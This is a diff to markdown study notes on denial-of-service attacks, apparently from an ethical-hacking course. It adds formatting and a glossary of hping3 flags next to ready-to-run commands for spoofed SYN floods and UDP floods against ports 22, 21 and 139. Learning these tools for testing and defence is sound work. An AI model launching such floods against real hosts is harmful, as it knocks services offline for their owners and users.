@@ -2,7 +2,7 @@
 
 **Attacker**
 
-hping3 -S \[Target IP] -a \[Spoofable IP] -p 22 -flood
+`hping3 -S [Target IP] -a [Spoofable IP] -p 22 -flood`
 
 * \-S: Set the SYN flag
 * \-a: Spoof the IP address
@@ -20,6 +20,18 @@ hping3 -d 65538 -S -p 21 –flood \[Target IP]
 
 * nmap -p 139 10.10.10.19 (check service)
 * hping3 -2 -p 139 –flood \[IP]
+
+Other Hping3 flags
+
+* \--udp -> specifies sending the UDP packets to the target host
+* \-2 -> specifies UDP mode
+* \--rand-source -> enables random source mode
+* \--data -> specifies the data body size
+* \-d -> specifies the data size
+* \-S -> sets the SYN flag
+* \-p -> assigning the port to send the traffic
+* \-c -> count of packets sent
+* \--flood -> performs TCP flooding (sends a huge # of packets)
 
 **Other UDP-based applications and their ports**
 
